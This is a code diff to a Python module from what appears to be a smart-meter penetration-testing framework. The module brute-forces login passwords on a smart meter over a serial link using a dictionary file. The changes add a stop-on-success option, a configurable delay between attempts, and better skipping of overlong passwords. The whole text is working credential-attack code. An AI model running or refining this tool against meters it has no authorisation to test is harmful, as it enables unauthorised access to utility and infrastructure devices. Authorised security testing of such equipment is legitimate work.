@@ -26,7 +26,7 @@ import re
 class Module(module_template):
 	def __init__(self, *args, **kwargs):
 		module_template.__init__(self, *args, **kwargs)
-		self.version = 1
+		self.version = 2
 		self.author = [ 'Spencer McIntyre <smcintyre@securestate.net>' ]
 		self.description = 'Brute Force Credentials'
 		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USEHEX to true.'
@@ -34,6 +34,8 @@ class Module(module_template):
 		self.options.addRFile('DICTIONARY', 'dictionary of passwords to try', required = True, default = '$DATA_PATH smeter_passwords.txt')
 		self.options.addString('USERNAME', 'user name to attempt to log in as', default = '0000')
 		self.options.addInteger('USERID', 'user id to attempt to log in as', default = 1)
+		self.advanced_options.addBoolean('STOPONSUCCESS', 'stop after the first successful login', default = True)
+		self.advanced_options.addFloat('DELAY', 'time in seconds to wait between attempts', default = 0.20)
 	
 	def run(self, frmwk):
 		conn = frmwk.serial_connection
@@ -42,6 +44,7 @@ class Module(module_template):
 		username = self.options.getOptionValue('USERNAME')
 		userid = self.options.getOptionValue('USERID')
 		logger = frmwk.get_module_logger(self.name)
+		time_delay = self.advanced_options.getOptionValue('DELAY')
 		
 		if len(username) > 10:
 			frmwk.print_error('Username cannot be longer than 10 characters')
@@ -75,21 +78,25 @@ class Module(module_template):
 					logger.warning('skipping password: ' + password.encode('hex') + ' due to length (can not be exceed 20 bytes)')
 				else:
 					logger.warning('skipping password: ' + password + ' due to length (can not be exceed 20 bytes)')
-			conn.start()
+				password = password_list.readline()
+				continue
+			while not conn.start():
+				sleep(time_delay)
+			sleep(time_delay)
 			if conn.login(username, userid, password):
 				if usehex:
 					frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
 				else:
 					frmwk.print_good('Successfully logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
+				if self.advanced_options.getOptionValue('STOPONSUCCESS'):
+					conn.stop()
+					break
 			if usehex:
 				logger.warning('Failed logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password.encode('hex'))
 			else:
 				logger.warning('Failed logged in. Username: ' + username + ' Userid: ' + str(userid) + ' Password: ' + password)
 			while not conn.stop():
-				sleep(0.5)
-			sleep(0.25)
-			while not conn.start():
-				sleep(0.5)
-			sleep(0.25)
+				sleep(time_delay)
+			sleep(time_delay)
 			password = password_list.readline()
 		password_list.close()
